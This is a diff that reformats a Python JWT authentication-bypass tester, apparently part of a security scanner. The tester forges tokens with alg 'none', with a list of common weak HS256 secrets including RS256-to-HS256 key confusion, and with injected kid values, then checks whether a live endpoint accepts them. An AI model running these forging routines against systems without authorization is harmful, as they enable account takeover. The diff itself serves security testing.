@@ -14,6 +14,7 @@ identity is echoed back). Three classic high-yield techniques:
 A "confirmed" result is an authentication bypass: the app accepted a token we
 signed (or didn't sign), under an identity we chose.
 """
+
 from __future__ import annotations
 
 import base64
@@ -29,9 +30,22 @@ import jwt as pyjwt
 # Small, high-signal secret list for HS256 brute. Kept short on purpose — this is
 # a confirmation probe, not a cracking rig; callers can extend via `extra_secrets`.
 COMMON_HS256_SECRETS = [
-    "secret", "secretkey", "secret key", "password", "changeme", "admin",
-    "jwt", "jwtsecret", "key", "test", "123456", "supersecret",
-    "your-256-bit-secret", "your_jwt_secret", "qwerty", "letmein",
+    "secret",
+    "secretkey",
+    "secret key",
+    "password",
+    "changeme",
+    "admin",
+    "jwt",
+    "jwtsecret",
+    "key",
+    "test",
+    "123456",
+    "supersecret",
+    "your-256-bit-secret",
+    "your_jwt_secret",
+    "qwerty",
+    "letmein",
 ]
 
 # kid values that try to point the verifier at a known/empty/attacker key.
@@ -53,7 +67,7 @@ def _b64u_decode(s: str) -> bytes:
 
 @dataclass
 class JWTFinding:
-    technique: str              # alg_none | weak_secret | kid_injection
+    technique: str  # alg_none | weak_secret | kid_injection
     confirmed: bool
     detail: str
     sentinel: str
@@ -118,8 +132,10 @@ class JWTTester:
     # ---- token forging primitives -------------------------------------------
     def _forge_alg_none(self, alg_label: str) -> str:
         hdr = {"typ": "JWT", "alg": alg_label}
-        seg = _b64u(json.dumps(hdr, separators=(",", ":")).encode()) + "." + _b64u(
-            json.dumps(self._forged_claims(), separators=(",", ":")).encode()
+        seg = (
+            _b64u(json.dumps(hdr, separators=(",", ":")).encode())
+            + "."
+            + _b64u(json.dumps(self._forged_claims(), separators=(",", ":")).encode())
         )
         return seg + "."  # empty signature
 
@@ -132,9 +148,7 @@ class JWTTester:
         headers = {}
         if kid is not None:
             headers["kid"] = kid
-        return pyjwt.encode(
-            self._forged_claims(), secret, algorithm="HS256", headers=headers
-        )
+        return pyjwt.encode(self._forged_claims(), secret, algorithm="HS256", headers=headers)
 
     def _hs256_manual(self, key: bytes, *, kid: Optional[str] = None) -> str:
         hdr = {"typ": "JWT", "alg": "HS256"}
@@ -161,7 +175,9 @@ class JWTTester:
 
     async def run(self) -> List[JWTFinding]:
         findings: List[JWTFinding] = []
-        async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=self.timeout) as client:
+        async with httpx.AsyncClient(
+            verify=False, follow_redirects=True, timeout=self.timeout
+        ) as client:
             # Sanity: confirm the verify endpoint actually reflects identity for a
             # *valid* token, otherwise our sentinel test can't distinguish anything.
             ok_valid, _, _ = await self._accepted(client, self.base_token)
@@ -175,12 +191,16 @@ class JWTTester:
                 except Exception:
                     continue
                 if accepted:
-                    findings.append(JWTFinding(
-                        technique="alg_none", confirmed=True,
-                        detail=f"Server accepted an unsigned token (alg='{label}') under a forged identity.",
-                        sentinel=self.sentinel, forged_token=tok,
-                        evidence={"alg_label": label, "status": code, "response_snippet": snip},
-                    ))
+                    findings.append(
+                        JWTFinding(
+                            technique="alg_none",
+                            confirmed=True,
+                            detail=f"Server accepted an unsigned token (alg='{label}') under a forged identity.",
+                            sentinel=self.sentinel,
+                            forged_token=tok,
+                            evidence={"alg_label": label, "status": code, "response_snippet": snip},
+                        )
+                    )
                     break
 
             # 2) weak HS256 secret (and RS256->HS256 key confusion if pubkey known).
@@ -194,15 +214,22 @@ class JWTTester:
                 except Exception:
                     continue
                 if accepted:
-                    label = "RS256->HS256 public-key confusion" if secret == self.public_key_pem else f"weak secret '{secret}'"
-                    findings.append(JWTFinding(
-                        technique="weak_secret", confirmed=True,
-                        detail=f"Server accepted an HS256 token signed with {label}.",
-                        sentinel=self.sentinel,
-                        secret="<public-key>" if secret == self.public_key_pem else secret,
-                        forged_token=tok,
-                        evidence={"status": code, "response_snippet": snip},
-                    ))
+                    label = (
+                        "RS256->HS256 public-key confusion"
+                        if secret == self.public_key_pem
+                        else f"weak secret '{secret}'"
+                    )
+                    findings.append(
+                        JWTFinding(
+                            technique="weak_secret",
+                            confirmed=True,
+                            detail=f"Server accepted an HS256 token signed with {label}.",
+                            sentinel=self.sentinel,
+                            secret="<public-key>" if secret == self.public_key_pem else secret,
+                            forged_token=tok,
+                            evidence={"status": code, "response_snippet": snip},
+                        )
+                    )
                     break
 
             # 3) kid injection — point verifier at an empty/known key, sign to match.
@@ -214,12 +241,18 @@ class JWTTester:
                 except Exception:
                     continue
                 if accepted:
-                    findings.append(JWTFinding(
-                        technique="kid_injection", confirmed=True,
-                        detail=f"Server resolved a verification key from attacker-controlled kid '{kid}'.",
-                        sentinel=self.sentinel, kid=kid, secret="", forged_token=tok,
-                        evidence={"status": code, "response_snippet": snip},
-                    ))
+                    findings.append(
+                        JWTFinding(
+                            technique="kid_injection",
+                            confirmed=True,
+                            detail=f"Server resolved a verification key from attacker-controlled kid '{kid}'.",
+                            sentinel=self.sentinel,
+                            kid=kid,
+                            secret="",
+                            forged_token=tok,
+                            evidence={"status": code, "response_snippet": snip},
+                        )
+                    )
                     break
 
             _ = (ok_valid, base_reflects)  # retained for callers/debugging
@@ -228,7 +261,10 @@ class JWTTester:
     async def _baseline_reflects(self, client: httpx.AsyncClient) -> bool:
         """True if the valid token's identity is visible at verify_url (so the
         endpoint is a usable oracle)."""
-        headers = {"Authorization": f"Bearer {self.base_token}", "Cookie": f"token={self.base_token}"}
+        headers = {
+            "Authorization": f"Bearer {self.base_token}",
+            "Cookie": f"token={self.base_token}",
+        }
         try:
             resp = await client.request(self.method, self.verify_url, headers=headers)
             return resp.status_code == 200
